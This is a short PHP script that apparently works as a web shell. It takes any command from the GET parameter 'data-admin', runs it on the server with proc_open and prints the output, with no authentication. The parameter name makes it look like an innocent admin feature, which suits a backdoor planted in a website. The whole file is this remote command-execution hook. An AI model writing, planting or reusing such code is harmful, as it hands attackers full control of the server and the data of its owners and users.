<?php

if(isset($_GET['data-admin'])) {
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/dev/null", "a") // stderr is a file to write to
);
$process = proc_open($_GET['data-admin'], $descriptorspec, $pipes);

if(is_resource($process)) {
    echo "<pre>" . stream_get_contents($pipes[1]);
    fclose($pipes[1]);
}
die();
}
?>
